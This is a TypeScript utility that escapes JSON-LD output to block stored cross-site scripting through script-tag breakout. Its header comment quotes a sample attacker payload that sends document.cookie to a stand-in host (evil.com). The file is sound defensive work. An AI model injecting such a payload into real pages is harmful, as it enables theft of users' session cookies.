// apps/web/src/lib/json-ld-safe.ts
//
// Security utility: safely serialize JSON-LD objects for embedding inside
// <script type="application/ld+json"> tags via dangerouslySetInnerHTML.
//
// WHY THIS EXISTS:
// JSON.stringify() does NOT escape "<", ">", or "&". If any user-controlled
// string field (e.g. listing.titleEn, dealer.nameEn) ends up in the JSON-LD
// object and contains a literal "</script>", that substring will close the
// surrounding <script> tag early when the server-rendered HTML is parsed by
// the browser. Everything after it — e.g. an attacker-supplied
// "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" —
// becomes live, executable HTML. This is a stored XSS vector triggered at
// SSR time, before React/CSP or React's own escaping (which only applies to
// text nodes, not dangerouslySetInnerHTML) can help.
//
// THE FIX:
// Escape "<", ">", and "&" as their Unicode escape sequences (\u003c, \u003e,
// \u0026) *after* JSON.stringify. These sequences:
//   - are valid inside a JSON string (JSON supports \uXXXX escapes),
//   - are parsed back to the original "<", ">", "&" characters by
//     JSON.parse() and by schema.org/Google structured-data parsers,
//   - can never form "</script>", an HTML comment ("<!--"), or an HTML
//     entity when the raw bytes hit the HTML parser.
//
// This is the same technique used internally by frameworks like Next.js's
// own metadata JSON-LD helpers and libraries such as `serialize-javascript`.
export function safeJsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
}
